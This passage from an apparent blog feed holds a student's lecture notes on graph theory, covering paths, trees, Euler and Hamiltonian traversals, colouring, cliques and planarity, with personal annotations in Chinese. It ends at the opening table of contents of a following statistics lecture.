        <content type="html"><![CDATA[<p>Lecture 16: Graph Theory</p><ul><li><a href="#motivation-and-applications">Motivation and Applications</a><ul><li><a href="#graph-theory-historical-motivation">Graph theory: Historical Motivation</a></li><li><a href="#graphs-in-computer-science">Graphs in Computer Science</a></li></ul></li><li><a href="#terminology-and-notation">Terminology and Notation</a><ul><li><a href="#graph-representations">Graph representations</a></li><li><a href="#paths">Paths</a></li><li><a href="#connectedness">Connectedness</a></li><li><a href="#vertex-degrees-undirected-graphs">Vertex Degrees (Undirected graphs)</a><ul><li><a href="#question">Question</a></li></ul></li><li><a href="#vertex-degrees-directed-graphs">Vertex Degrees (Directed graphs)</a></li><li><a href="#exercise-1">Exercise 1</a></li><li><a href="#exercise-2">Exercise 2</a></li><li><a href="#cycles">Cycles</a></li><li><a href="#trees">Trees</a></li><li><a href="#trees-1">Trees</a></li><li><a href="#exercise-supplementary">Exercise (Supplementary)</a></li><li><a href="#bipartite-graphs">Bipartite Graphs</a></li><li><a href="#special-graphs">Special Graphs</a><ul><li><a href="#complete-graph-k_n">Complete graph $K_n$</a></li><li><a href="#complete-bipartite-graph-k_mn">Complete bipartite graph $K_{m,n}$</a></li><li><a href="#complete-k-partite-graph-k_m_1m_k">Complete k-partite graph $K_{m_1,…,m_k}$</a></li></ul></li><li><a href="#graph-isomorphisms">Graph Isomorphisms</a></li></ul></li><li><a href="#graph-traversals">Graph Traversals</a><ul><li><a href="#graph-exploration">Graph exploration</a></li><li><a href="#special-types-of-traversals">Special types of traversals</a></li><li><a href="#edge-traversal">Edge Traversal</a><ul><li><a href="#definition">Definition</a></li><li><a href="#characterisations">Characterisations</a></li><li><a href="#exercise-1-1">exercise 1</a></li><li><a href="#exercise-2-1">exercise 2</a></li><li><a href="#exercise-3">exercise 3</a></li></ul></li><li><a href="#vertex-traversal">Vertex Traversal</a><ul><li><a href="#definition-1">Definition</a></li></ul></li></ul></li><li><a href="#properties-of-graphs">Properties of Graphs</a><ul><li><a href="#colouring">Colouring</a></li><li><a href="#properties-of-the-chromatic-number">Properties of the Chromatic Number</a></li><li><a href="#cliques">Cliques</a><ul><li><a href="#definition-2">Definition</a></li></ul></li><li><a href="#theorem">Theorem</a></li><li><a href="#exercise-1-2">exercise 1</a></li><li><a href="#exercise-2-2">exercise 2</a></li><li><a href="#timetable-scheduling">Timetable scheduling</a></li><li><a href="#planar-graphs">Planar Graphs</a><ul><li><a href="#definition-3">Definition</a></li><li><a href="#theorem-1">Theorem</a></li><li><a href="#take-notice">Take Notice</a></li></ul></li><li><a href="#nonplanar-graphs">Nonplanar graphs</a></li><li><a href="#three-utilities-problem">Three utilities problem</a></li><li><a href="#testing-for-nonplanarity">Testing for nonplanarity</a><ul><li><a href="#theorem-2">Theorem</a></li><li><a href="#theorem-3">Theorem</a></li></ul></li><li><a href="#more-nonplanar-graphs">More nonplanar graphs</a><ul><li><a href="#theorem-4">Theorem</a></li><li><a href="#proof">Proof</a></li><li><a href="#theorem-5">Theorem</a></li><li><a href="#proof-1">Proof</a></li><li><a href="#exercise-1-3">exercise 1</a></li><li><a href="#exercise-2-3">exercise 2</a></li></ul></li></ul></li></ul><h1 id="Motivation-and-Applications"><a href="#Motivation-and-Applications" class="headerlink" title="Motivation and Applications"></a>Motivation and Applications</h1><h2 id="Graph-theory-Historical-Motivation"><a href="#Graph-theory-Historical-Motivation" class="headerlink" title="Graph theory: Historical Motivation"></a>Graph theory: Historical Motivation</h2><p>Bridges of K¨onigsberg problem</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-35-23.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-35-38.png" alt></p><p>Can you find a route which crosses each bridge exactly once?</p><p>No! It doesn’t have such a solution.</p><p>Five rooms problem</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-38-30.png" alt></p><p>Can you find a route which passes through each door exactly once?</p><p>Crossed house problem</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-38-50.png" alt></p><p>Can you draw this without taking your pen off the paper?</p><p>Three utilities problem</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-39-20.png" alt></p><p>Can you connect all utilities to all houses without crossing connections?</p><p>The following table describes several subjects and the students taking them:</p><div class="table-container"><table><thead><tr><th>Potions</th><th>Charms</th><th>Herbology</th><th>Astronomy</th><th>Transfiguration</th></tr></thead><tbody><tr><td>Harry</td><td>Ron</td><td>Harry</td><td>Hermione</td><td>Hermione</td></tr><tr><td>Ron</td><td>Luna</td><td>George</td><td>Neville</td><td>Fred</td></tr><tr><td>Malfoy</td><td>Ginny</td><td>Neville</td><td>Seamus</td><td>Luna</td></tr></tbody></table></div><p>How many examination timeslots are needed so that no student has two (or more) exams at the same time?</p><h2 id="Graphs-in-Computer-Science"><a href="#Graphs-in-Computer-Science" class="headerlink" title="Graphs in Computer Science"></a>Graphs in Computer Science</h2><p>Applications of graphs in Computer Science are abundant, e.g.</p><ul><li>route planning in navigation systems, robotics</li><li>optimisation, e.g. timetables, utilisation of network structures, bandwidth allocation</li><li>compilers using “graph colouring” to assign registers to program variables</li><li>circuit layout (Untangle game)</li><li>determining the significance of a web page (Google’s pagerank algorithm)</li><li>modelling the spread of a virus in a computer network or news in social network</li></ul><h1 id="Terminology-and-Notation"><a href="#Terminology-and-Notation" class="headerlink" title="Terminology and Notation"></a>Terminology and Notation</h1><p>Terminology (the most common; there are many variants): </p><p><strong>Graph</strong> — pair (V,E) where V– set of vertices (or nodes) E– set of edges</p><p><strong>Undirected graph</strong>: Every edge e ∈ E is a two-element set of vertices, i.e. e = {x,y} ⊆ V where x= y</p><p><strong>Directed graph</strong>: Every edge (or arc) e ∈ E is an ordered pair of vertices, i.e. e = (x,y) ∈ V ×V, note x may equal y.</p><h2 id="Graph-representations"><a href="#Graph-representations" class="headerlink" title="Graph representations"></a>Graph representations</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-46-04.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-46-14.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-47-07.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-48-17.png" alt></p><p>我对这个图的理解，无向图，横坐标是定点，纵坐标是那几个Edge；有向图，横纵坐标都是定点，纵射向横（好像不对），完了问问。</p><h2 id="Paths"><a href="#Paths" class="headerlink" title="Paths"></a>Paths</h2><p>A (directed) walk in a (directed) graph (V,E) is a sequence of edges that link up</p><script type="math/tex; mode=display">v_0 \overset{\{v_0,v_1\}}{→} v_1 \overset{\{v_1,v_2\}}{→} ... \overset{\{v_{n-1},v_n\}}{→} v_n</script><p>where $e<em>i$ = {$v</em>{i−1},v<em>i$} ∈ $E (or \quad e_i = (v</em>{i−1},v_i) ∈ E)$</p><p>A <strong>trail</strong> is a walk where no edge is repeated. $(∀i, j ∈ [n],e_i \neq e_j)$</p><p>trail过边，点重复</p><p>A <strong>path</strong> is a walk where no vertex is repeated $(∀i, j ∈$ {0,…n − 1}$,v_i \neq v_j)$</p><p>path过点，边重复</p><p><strong>length</strong> of a walk is the number of edges: n neither the vertices nor the edges have to be all different</p><p>Subpath\subwalk of length $r: (e<em>m,e</em>{m+1},…,e_{m+r−1})$</p><p>Path of length 0: single vertex $v_0$</p><h2 id="Connectedness"><a href="#Connectedness" class="headerlink" title="Connectedness"></a>Connectedness</h2><p><strong>Connected set/graph</strong> (<strong>undirected</strong>) — each pair of vertices joined by a path</p><p><strong>Strongly connected set/graph</strong> (<strong>directed</strong>) — each pair of vertices joined by a directed <strong>path</strong> in both directions</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-19-15-23.png" alt></p><p>Given a graph $G = (V,E)$, we call a set of vertices $U ⊆ V$ a <strong>connected component</strong> of G, if every pair of vertices $u, v ∈ U$ is connected by some <strong>path</strong>, and $U$ is maximal with this property.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-19-18-25.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-19-23-40.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-19-27-00.png" alt></p><h2 id="Vertex-Degrees-Undirected-graphs"><a href="#Vertex-Degrees-Undirected-graphs" class="headerlink" title="Vertex Degrees (Undirected graphs)"></a>Vertex Degrees (Undirected graphs)</h2><p><strong>Degree</strong> of a vertex</p><script type="math/tex; mode=display">deg(v) = |\{ w ∈ V :\{v,w\} ∈ E \}|</script><p>i.e., the number of edges attached to the vertex</p><p><strong>Regular graph</strong> — all degrees are equal</p><p><strong>Degree sequence</strong> $D_0,D_1,D_2,…,D_k$ of graph $G = (V,E)$, where $D_i$ = no. of vertices of degree i</p><p>注意啊，这个下标，不是说第几个点的度数，是有几个度的点。</p><h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>What is $D_0 +D_1 +…+D_k$?</p><p><strong>Fact</strong></p><p>$\sum_{v \in V} deg(v) = 2·|E|$; so the sum of vertex degrees is always even.</p><p><strong>Corollary</strong></p><p>There is an even number of vertices of odd degree.</p><h2 id="Vertex-Degrees-Directed-graphs"><a href="#Vertex-Degrees-Directed-graphs" class="headerlink" title="Vertex Degrees (Directed graphs)"></a>Vertex Degrees (Directed graphs)</h2><p><strong>Out-degree</strong> of a vertex</p><script type="math/tex; mode=display">outdeg(v) = |\{ w ∈ V :(v,w) ∈ E \}|</script><p>i.e., the number of edges going out of the vertex</p><p><strong>In-degree</strong> of a vertex</p><script type="math/tex; mode=display">indeg(v) = |\{ w ∈ V :(w,v) ∈ E \}|</script><p>i.e., the number of edges going in to the vertex</p><p><strong>Fact</strong></p><script type="math/tex; mode=display">\sum_{v \in V} outdeg(v) = \sum_{v \in V} indeg(v) = |E|</script><h2 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h2><p>Draw a connected, regular graph on four vertices, each of degree 2</p><p>Draw a connected, regular graph on four vertices, each of degree 3</p><p>Draw a connected, regular graph on five vertices, each of degree 3</p><p>Graph with 3 vertices and 3 edges</p><p>Two graphs each with 4 vertices and 4 edges</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-06-00-33.png" alt></p><p>Take Notice</p><p>We use the notation</p><p>$n =v(G) =|V|$ for the no. of vertices of graph $G = (V,E)$</p><p>$m=e(G)=|E|$ for the no. of edges of graph $G = (V,E)$</p><h2 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h2><p>Graph with $e(G)=21$ edges has a degree sequence $D_0 =0,D_1 =7,D_2 =3,D_3 =7,D_4 =$?</p><p>Find $v(G)$</p><p>$\sum<em>{v} deg(v)= 2|E|$; here $7 · 1+3·2+7·3+x ·4=2·21$  giving $x = 2$, thus $v(G) = \sum</em>{D_i} =19$.</p><p>How would your answer change, if at all, when $D_0 =6$?</p><p>No change to $D_4$; $v(G) = 25$.</p><p>算顶点时，勿忘加$D_0$ (度数为0的定点)</p><h2 id="Cycles"><a href="#Cycles" class="headerlink" title="Cycles"></a>Cycles</h2><p>Recall walks $v_0 \overset{e_1}{→} v_1 \overset{e_2}{→} … \overset{e_n}{→} v_n$</p><ul><li>closed walk — $v_0 = v_n$</li></ul><p>意思是如果首尾同点，意味着首尾相连，就是封闭walk。</p><ul><li><strong>cycle</strong> — closed walk of length 3 or more (2 or more in directed graphs) whose vertices are distinct except $v_0$ and $v_n$.</li></ul><p>无向图至少三点，有向图至少两点。</p><ul><li>acyclic walk (equivalent to path) — $v_i \neq v_j$ for all vertices in the path $(i \neq j)$</li></ul><p><strong>Take Notice</strong></p><p>$C =(e_1,…,e_n)$ is a <strong>cycle</strong> iff removing any single edge leaves a <strong>path</strong>.</p><p>C is a <strong>cycle</strong> if it has the same number of edges and vertices ($|V_G| = |E_G|$) and no proper subwalk has this property.</p><h2 id="Trees"><a href="#Trees" class="headerlink" title="Trees"></a>Trees</h2><p><strong>Acyclic graph</strong> — graph that doesn’t contain any cycle </p><p><strong>Tree</strong> — connected acyclic [undirected] graph</p><p>A graph is acyclic iff it is a forest (collection of disjoint trees)</p><p>Take Notice</p><p>Graph G is a <strong>tree</strong> if</p><p>⇔ it is acyclic and $|V_G| = |E_G| +1$.</p><p>⇔ there is exactly one path between any two vertices.</p><p>⇔ G is connected, but becomes disconnected if any single edge is removed.</p><p>⇔ G is acyclic, but has a cycle if any single edge on already existing vertices is added.</p><h2 id="Trees-1"><a href="#Trees-1" class="headerlink" title="Trees"></a>Trees</h2><p>A tree with one vertex designated as its root is called a rooted tree.</p><p>It imposes a direction on the edges: ‘away’ from the root — from parent nodes to children. It also defines a level number (or: depth) of a node as its distance from the root.</p><p>Another very common notion in Computer Science is that of a <strong>DAG</strong> —<strong>a directed, acyclic graph</strong>.</p><h2 id="Exercise-Supplementary"><a href="#Exercise-Supplementary" class="headerlink" title="Exercise (Supplementary)"></a>Exercise (Supplementary)</h2><p>(Supp) Tree T with n vertices, $n ≥3$. Always true, false or could be either?</p><p>(a) e(T) $\overset{?}{=}$ n</p><p>False. V(T) = E(T) + 1</p><p>(b) at least one vertex of degree exactly 2?</p><p>Could be either</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-04-24.png" alt></p><p>(c) at least two $v_1,v_2$ s.t. $deg(v_1)=deg(v_2)$</p><p>True</p><p>(d) exactly one path from $v_1$ to $v_2$</p><p>True (characterises a tree)</p><h2 id="Bipartite-Graphs"><a href="#Bipartite-Graphs" class="headerlink" title="Bipartite Graphs"></a>Bipartite Graphs</h2><p>Can divide the vertices into two disjoint sets, $V = V_1 ∪ V_2$</p><p>Each edge must connect a vertex from $V_1$ to a vertex from $V_2$</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-06-30.png" alt></p><h2 id="Special-Graphs"><a href="#Special-Graphs" class="headerlink" title="Special Graphs"></a>Special Graphs</h2><h3 id="Complete-graph-K-n"><a href="#Complete-graph-K-n" class="headerlink" title="Complete graph $K_n$"></a>Complete graph $K_n$</h3><p>n vertices, all pairwise connected, $\frac{n(n-1)}{2}$ edges.</p><h3 id="Complete-bipartite-graph-K-m-n"><a href="#Complete-bipartite-graph-K-m-n" class="headerlink" title="Complete bipartite graph $K_{m,n}$"></a>Complete bipartite graph $K_{m,n}$</h3><p>Has $m+n$ vertices, partitioned into two (disjoint) sets, one of n, the other of m vertices. </p><p>All vertices from different parts are connected; vertices from the same part are disconnected. No. of edges is $m · n$</p><h3 id="Complete-k-partite-graph-K-m-1-…-m-k"><a href="#Complete-k-partite-graph-K-m-1-…-m-k" class="headerlink" title="Complete k-partite graph $K_{m_1,…,m_k}$"></a>Complete k-partite graph $K_{m_1,…,m_k}$</h3><p>Has $m_1 +…+m_k$ vertices, partitioned into k disjoint sets, respectively of $m_1,m_2,…$ vertices.</p><p>No. of edges is $\sum<em>{i&lt;j}m_im_j = \frac{1}{2} \sum</em>{i \neq j}m_im_j$</p><p>These graphs generalise the complete graphs</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-10-29.png" alt></p><p>前面完全图是一个概念，后面俩 n分图 是一个概念。因为mi * mj （i不等于j是说不要自己搞完全图，因为这是k分图，没有reflexive）。因为axb 和 bxa是一会儿事儿，所以要除以2. 2分图的 mxj其实也是这个公式。</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-20-40.png" alt></p><h2 id="Graph-Isomorphisms"><a href="#Graph-Isomorphisms" class="headerlink" title="Graph Isomorphisms"></a>Graph Isomorphisms</h2><p>$ϕ : G → H$ is a <strong>graph isomorphism</strong> if</p><p>$ϕ : V_G → V_H$ is a bijection</p><p>$(x,y) ∈ E_G$ iff $(ϕ(x),ϕ(y)) ∈ E_H$</p><p>Two graphs are called <strong>isomorphic</strong> if there exists (at least one) isomorphism between them.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-27-28.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-27-49.png" alt></p><p>All nonisomorphic trees on 2,3,4 and 5 vertices.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-23-31.png" alt></p><h1 id="Graph-Traversals"><a href="#Graph-Traversals" class="headerlink" title="Graph Traversals"></a>Graph Traversals</h1><h2 id="Graph-exploration"><a href="#Graph-exploration" class="headerlink" title="Graph exploration"></a>Graph exploration</h2><p>Often it is useful to “explore” a graph: visit vertices in some order and examine each one.</p><p><strong>Search</strong>: Explore the graph until a particular vertex is discovered.</p><p><strong>Traversal</strong>: Examine all the vertices of the graph</p><p>Two common graph exploration algorithms are <strong>Depth-first search/traversal (DFS)</strong> and <strong>Breadth-first search/traversal (BFS)</strong>.</p><p>Both follow the same structure:</p><ul><li>Examine a vertex v</li><li>Discover new vertices (i.e., neighbours of v)</li><li>Move to the next discovered but not yet examined vertex</li></ul><p><strong>DFS</strong>: Examine vertices by <strong>most</strong> recently discovered</p><p><strong>BFS</strong>: Examine vertices by <strong>least</strong> recently discovered</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-33-51.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-34-32.png" alt></p><h2 id="Special-types-of-traversals"><a href="#Special-types-of-traversals" class="headerlink" title="Special types of traversals"></a>Special types of traversals</h2><p>Often we are interested in traversals that have a certain property.</p><p>For example:</p><ul><li><strong>Eulerian</strong> traversals: Visit all the <strong>edges</strong> exactly once</li><li><strong>Hamiltonian</strong> traversals: Visit all the <strong>vertices</strong> exactly once</li></ul><p>欧拉-trail-所有边一次</p><p>汉密尔顿-path-所有点一次</p><p><strong>Take Notice</strong></p><p>In any given graph, these traversals may or may not exist.</p><p>Establishing the existence of such a traversal (decision problem) vs finding one if it exists (search problem) are subtly different problems.</p><h2 id="Edge-Traversal"><a href="#Edge-Traversal" class="headerlink" title="Edge Traversal"></a>Edge Traversal</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>For a graph G = (V,E).</p><p><strong>Euler trail</strong> — trail containing every edge in E exactly once</p><p><strong>Euler circuit</strong> — closed Euler trail</p><h3 id="Characterisations"><a href="#Characterisations" class="headerlink" title="Characterisations"></a>Characterisations</h3><p>Suppose G is connected. Then <strong>G</strong> has an <strong>Euler circuit</strong> iff <strong>deg(v) is even for all</strong> $v ∈ V$.</p><p>Suppose G is connected. Then <strong>G</strong> has an <strong>Euler trail</strong> iff either it has an Euler circuit or it has <strong>exactly two vertices of odd degree</strong>.</p><p><strong>Take Notice</strong></p><ul><li>These characterisations apply to multigraphs as well</li><li>For directed graphs the condition for existence of an Euler circuit is $indeg(v) = outdeg(v)$ for all $v ∈ V$</li></ul><p>欧拉道路（Euler trail）：所有边且每条边只走一次的路径，可以是开路径（起点和终点不同），也可以是闭路径（起点和终点相同）。</p><p>欧拉回路（Euler circuit）：欧拉回路是欧拉道路的一种特殊情况，要求路径是闭合的，即起点和终点是同一个顶点。</p><script type="math/tex; mode=display">Euler circuit ⊆ Euler trail</script><p>Hence</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-58-23.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-58-41.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-59-34.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-00-33.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-01-21.png" alt></p><h3 id="exercise-1"><a href="#exercise-1" class="headerlink" title="exercise 1"></a>exercise 1</h3><p>Construct a graph with vertex set <strong>{0,1} ×{0,1}×{0,1}</strong> and with an edge between vertices if they differ in exactly <strong>two</strong> coordinates.</p><p>(a) How many components does this graph have?</p><p>(b) How many vertices of each degree?</p><p>(c) Euler circuit?</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-08-48.png" alt></p><h3 id="exercise-2"><a href="#exercise-2" class="headerlink" title="exercise 2"></a>exercise 2</h3><p>As the question above but with an edge between vertices if they differ in two or three coordinates.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-10-35.png" alt></p><p>About why, we can see even degrees between each vertices.</p><h3 id="exercise-3"><a href="#exercise-3" class="headerlink" title="exercise 3"></a>exercise 3</h3><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-11-59.png" alt></p><p>因为在完全图中，n点有(n-1)个度，所以当n是奇数，他才有偶数个度。</p><p>完全二分图中，每个部分的点不和自己一个part的点连接，只和对面part的店连接，因此n和m都是偶数，度才是偶数。</p><p>三分图，设m,n,q三个部分。只有两两相加才能是偶数个度，因此要么全奇数，要么全偶数。</p><h2 id="Vertex-Traversal"><a href="#Vertex-Traversal" class="headerlink" title="Vertex Traversal"></a>Vertex Traversal</h2><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h3><ul><li><strong>Hamiltonian path</strong> visits every vertex of graph exactly once</li><li><strong>Hamiltonian cycle</strong> visits every vertex exactly once except the last one, which duplicates the first</li></ul><p><strong>Take Notice</strong></p><p>Finding such a cycle, or proving it does not exist, is a difficult problem — the worst case is NP-complete.</p><p>Examples (where the Hamiltonian cycle exists)</p><ul><li>Tetrahedron</li><li>Hexahedron</li><li>$K_m$ for all m</li><li>$K_{m,n}$ iff m = n</li></ul><p>Examples when a Hamiltonian cycle does not exist are much harder to construct.</p><p>Also, given such a graph, it is nontrivial to verify that there is no Hamiltonian cycle. </p><p>There is nothing obvious to specify that could assure us about this property. We have to check all possibilities.</p><p>In contrast, if a cycle is given, it is immediate to verify that it is a Hamiltonian cycle.</p><p>These situations demonstrate the often enormous discrepancy in difficulty of ‘proving’ versus (simply) ‘checking’.</p><p><img src="/2024/11/19/Math/Graph-Theory/Graph.png" alt></p><h1 id="Properties-of-Graphs"><a href="#Properties-of-Graphs" class="headerlink" title="Properties of Graphs"></a>Properties of Graphs</h1><h2 id="Colouring"><a href="#Colouring" class="headerlink" title="Colouring"></a>Colouring</h2><p>Informally: assigning a “colour” to each vertex so that the vertices connected by an edge have different colours.</p><p>Formally: A mapping $c : V → [1..t]$ such that for every $e =(v,w) ∈ E$</p><script type="math/tex; mode=display">c(v) \neq c(w)</script><p>The <strong>minimum</strong> t sufficient to effect such a mapping is called the <strong>chromatic number</strong> of a graph $G$ and is denoted $χ(G)$.</p><p><strong>Take Notice</strong></p><p>This notion is extremely important in operations research, esp. in scheduling.</p><p>There is a dual notion of ‘edge colouring’ — two edges that share a vertex need to have different colours. Curiously enough, it is much less useful in practice.</p><h2 id="Properties-of-the-Chromatic-Number"><a href="#Properties-of-the-Chromatic-Number" class="headerlink" title="Properties of the Chromatic Number"></a>Properties of the Chromatic Number</h2><ul><li>$χ(K_n) = n$</li><li>If G has n vertices and $χ(G) = n$ then $G = K_n$</li><li>If $χ(G)$ = 1 then G is totally disconnected: it has 0 edges.</li><li>If $χ(G) = 2$ then G is bipartite</li><li>For any tree $χ(T) = 2$</li><li>For any cycle $C_n$ its chromatic number depends on the parity of n — for n even $χ(C_n) = 2$, while for n odd $χ(C_n) = 3$.</li></ul><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-17-12.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-17-20.png" alt></p><h2 id="Cliques"><a href="#Cliques" class="headerlink" title="Cliques"></a>Cliques</h2><p>Graph $G′ = (V′,E′)$ is a <strong>subgraph</strong> of $G = (V,E)$, if $V′ ⊆ V$ and $E′ ⊆ E$.</p><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition"></a>Definition</h3><p>A <strong>clique</strong> in G is a complete subgraph of G. A clique of k nodes is called <strong>k-clique</strong>.</p><p>The size of the largest clique is called the <strong>clique number</strong> of the graph and denoted $κ(G)$.</p><ol><li>团是完全图</li><li>团数 是子图的最大团的定点数。</li></ol><h2 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h2><script type="math/tex; mode=display">χ(G) ≥ κ(G).</script><p><strong>Proof</strong></p><p>Every vertex of a clique requires a different colour, hence there must be at least $κ(G)$ colours.</p><p>However, this is the only restriction. For any given k there are graphs with $κ(G) = k$, while $χ(G)$ can be arbitrarily large.</p><p><strong>Take Notice</strong></p><p>This fact (and such graphs) are important in the analysis of parallel computation algorithms.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-26-26.png" alt></p><h2 id="exercise-1-1"><a href="#exercise-1-1" class="headerlink" title="exercise 1"></a>exercise 1</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-27-00.png" alt></p><p>A. $χ(G1) = κ(G1) = 3$; $χ(G2) = κ(G2) = 2$; $χ(G3) = κ(G3) = 3$</p><h2 id="exercise-2-1"><a href="#exercise-2-1" class="headerlink" title="exercise 2"></a>exercise 2</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-27-35.png" alt></p><h2 id="Timetable-scheduling"><a href="#Timetable-scheduling" class="headerlink" title="Timetable scheduling"></a>Timetable scheduling</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-29-11.png" alt></p><h2 id="Planar-Graphs"><a href="#Planar-Graphs" class="headerlink" title="Planar Graphs"></a>Planar Graphs</h2><h3 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition"></a>Definition</h3><p>A graph is <strong>planar</strong> if it can be embedded in a plane without its edges <strong>intersecting</strong>.</p><h3 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h3><p>If the graph is planar it can be embedded (without self-intersections) in a plane so that all its edges are <strong>straight</strong> lines.</p><h3 id="Take-Notice"><a href="#Take-Notice" class="headerlink" title="Take Notice"></a>Take Notice</h3><p>This notion and its related algorithms are extremely important to VLSI (very large-scale integration– refers to an IC or technology with many devices on one chip) and visualizing data.</p><p>是说嵌入平面，线不会交叉。不要把planar理解成二维三维差别。</p><h2 id="Nonplanar-graphs"><a href="#Nonplanar-graphs" class="headerlink" title="Nonplanar graphs"></a>Nonplanar graphs</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-32-29.png" alt></p><p>They are not planar graphs.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-51-43.png" alt></p><h2 id="Three-utilities-problem"><a href="#Three-utilities-problem" class="headerlink" title="Three utilities problem"></a>Three utilities problem</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-52-06.png" alt></p><h2 id="Testing-for-nonplanarity"><a href="#Testing-for-nonplanarity" class="headerlink" title="Testing for nonplanarity"></a>Testing for nonplanarity</h2><h3 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h3><p>If graph G contains, as a subgraph, a nonplanar graph, then G itself is nonplanar.</p><p>For a graph, <strong>edge subdivision</strong> means to introduce some new vertices, all of degree 2, by placing them on existing edges.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-54-24.png" alt></p><p>We call such a derived graph a <strong>subdivision</strong> of the original one.</p><h3 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h3><p>If a graph is nonplanar then it must contain a subdivision of $K<em>5$ or $K</em>{3,3}$.</p><h2 id="More-nonplanar-graphs"><a href="#More-nonplanar-graphs" class="headerlink" title="More nonplanar graphs"></a>More nonplanar graphs</h2><h3 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="Theorem"></a>Theorem</h3><p>$K_n$ for $n ≥ 5$ is nonplanar.</p><h3 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h3><p>It contains $K_5$: choose any five vertices in $K_n$ and consider the subgraph they define.</p><h3 id="Theorem-5"><a href="#Theorem-5" class="headerlink" title="Theorem"></a>Theorem</h3><p>$K_{m,n}$ is nonplanar when $m ≥ 3$ and $n ≥ 3$.</p><h3 id="Proof-1"><a href="#Proof-1" class="headerlink" title="Proof"></a>Proof</h3><p>They contain $K_{3,3}$ — choose any three vertices in each of two vertex parts and consider the subgraph they define.</p><h3 id="exercise-1-2"><a href="#exercise-1-2" class="headerlink" title="exercise 1"></a>exercise 1</h3><p>![](<strong>Q</strong>. Are all $K_{m,1}$ planar?</p><p><strong>A</strong>. Yes, they are <strong>trees</strong> of two levels — the root and m leaves.</p><h3 id="exercise-2-2"><a href="#exercise-2-2" class="headerlink" title="exercise 2"></a>exercise 2</h3><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-10-00-38.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Statistics</title>
      <link href="/2024/11/19/Math/Statistics/"/>
      <url>/2024/11/19/Math/Statistics/</url>
      
        <content type="html"><![CDATA[<p>Lecture 15: Statistics</p><ul><li><a href="#random-variables-and-expectation">Random Variables and Expectation</a><ul><li><a href="#definition">Definition</a></li><li><a href="#definition-1">Definition</a></li><li><a href="#example">Example</a></li><li><a href="#example-1">Example</a></li><li><a href="#question">Question</a></li><li><a href="#expectation">Expectation</a><ul><li><a href="#definition-2">Definition</a></li><li><a href="#examples-dice">Examples: dice</a></li><li><a href="#examples-dice-1">Examples: dice</a></li></ul></li></ul></li><li><a href="#linearity-of-expectation">Linearity of Expectation</a><ul><li><a href="#theorem-linearity-of-expected-value">Theorem (linearity of expected value)</a><ul><li><a href="#example-1">Example 1</a></li><li><a href="#example-2">Example 2</a><ul><li><a href="#answer-1-the-hard-way">Answer 1. (the ‘hard way’)</a></li><li><a href="#answer-2-the-easy-way">Answer 2. (the ‘easy way’)</a></li></ul></li></ul></li><li><a href="#observations">Observations</a><ul><li><a href="#exercises-1">Exercises 